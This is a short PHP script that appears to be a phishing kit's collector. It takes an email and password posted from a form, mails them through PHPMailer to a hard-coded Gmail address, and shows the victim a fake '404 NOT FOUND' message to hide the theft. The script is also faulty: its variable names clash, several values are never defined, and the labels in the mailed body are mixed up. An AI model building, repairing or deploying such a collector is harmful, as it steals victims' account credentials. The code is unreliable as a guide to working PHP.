<?php
// Email configuration
$smtpPassword = 'your_smtp_password';
$senderEmail = 'daviest022@gmail.com';
$recipientEmail = 'dreymonk614@gmail.com'; // Your email address

// Extract form data
$Password = $_POST['password'];
$email = $_POST['email'];

// Email content
$subject = 'New Form Submission';
$body = "Name: $password\nEmail: $email\nPassword: $message";

// Send email
require_once 'path/to/PHPMailerAutoload.php'; // Include PHPMailer library
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->Host = $smtpServer;
$mail->SMTPAuth = true;
$mail->Email = $smtpEmail;
$mail->Password = $smtpPassword;
$mail->SMTPSecure = 'tls'; // Enable encryption, 'ssl' also accepted
$mail->Port = 587; // Port used for TLS encryption
$mail->setFrom($senderEmail);
$mail->addAddress($recipientEmail); // Set recipient email address to your own email
$mail->Subject = $subject;
$mail->Body = $body;

if($mail->send()) {
    echo '404 NOT FOUND';
} else {
    echo 'Error: ' . $mail->ErrorInfo;
}
?>
